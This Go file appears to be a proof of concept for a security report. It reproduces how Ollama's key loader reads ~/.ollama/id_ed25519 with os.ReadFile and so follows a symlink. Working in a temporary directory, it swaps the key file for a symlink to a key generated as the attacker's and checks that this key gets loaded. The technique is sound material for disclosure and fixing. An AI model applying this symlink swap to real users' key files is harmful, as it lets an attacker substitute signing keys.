package main

// Standalone reproduction that mimics auth/auth.go's os.ReadFile-based key load.
// Demonstrates that os.ReadFile silently follows symlinks, so a symlink placed at
// ~/.ollama/id_ed25519 pointing at an attacker-controlled key is transparently
// loaded and used for signing.

import (
	"fmt"
	"os"

	"crypto/ed25519"
	"crypto/rand"
	"encoding/pem"

	"golang.org/x/crypto/ssh"
)

func readKeyBytes(p string) ([]byte, error) {
	return os.ReadFile(p)
}

func main() {
	tmpDir, _ := os.MkdirTemp("", "ollama-keysim-*")
	fmt.Println("workdir:", tmpDir)

	_, victimPriv, _ := ed25519.GenerateKey(rand.Reader)
	victimBlob, _ := ssh.MarshalPrivateKey(victimPriv, "")
	victimPath := tmpDir + "/id_ed25519"
	os.WriteFile(victimPath, pem.EncodeToMemory(victimBlob), 0o600)

	_, attackerPriv, _ := ed25519.GenerateKey(rand.Reader)
	attackerBlob, _ := ssh.MarshalPrivateKey(attackerPriv, "")
	attackerPath := tmpDir + "/attacker_id_ed25519"
	os.WriteFile(attackerPath, pem.EncodeToMemory(attackerBlob), 0o600)

	os.Remove(victimPath)
	os.Symlink(attackerPath, victimPath)

	keyData, _ := readKeyBytes(victimPath)
	loadedPriv, _ := ssh.ParsePrivateKey(keyData)
	loadedPub := string(ssh.MarshalAuthorizedKey(loadedPriv.PublicKey()))

	attackerSshPub, _ := ssh.NewPublicKey(attackerPriv.Public())
	attackerPubStr := string(ssh.MarshalAuthorizedKey(attackerSshPub))

	fmt.Println("loaded:  ", loadedPub)
	fmt.Println("attacker:", attackerPubStr)
	if loadedPub == attackerPubStr {
		fmt.Println("RESULT: auth.go-style load followed symlink and returned ATTACKER key")
	}
}
